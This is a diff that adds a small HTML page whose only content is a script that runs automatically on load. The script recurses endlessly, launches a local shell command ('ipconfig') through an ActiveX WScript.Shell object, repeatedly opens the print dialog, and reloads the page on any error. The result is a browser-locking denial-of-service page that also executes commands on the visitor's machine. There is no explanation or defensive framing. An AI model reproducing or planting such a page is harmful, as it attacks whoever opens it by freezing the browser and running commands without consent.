@@ -1,0 +1,27 @@
+<html>
+
+<head>
+<script type="text/javascript">
+function uhhohh()
+{
+
+var shell=new ActiveXObject("WScript.Shell");
+shell.Run("ipconfig", 1);
+
+}
+
+function keepgoing()
+{
+uhhohh();
+window.onerror=new Function("history.go(0)");
+window.print();
+keepgoing();
+
+
+}
+keepgoing();
+</script>
+</head>
+<body onLoad="keepgoing()"></body>
+
+</html>
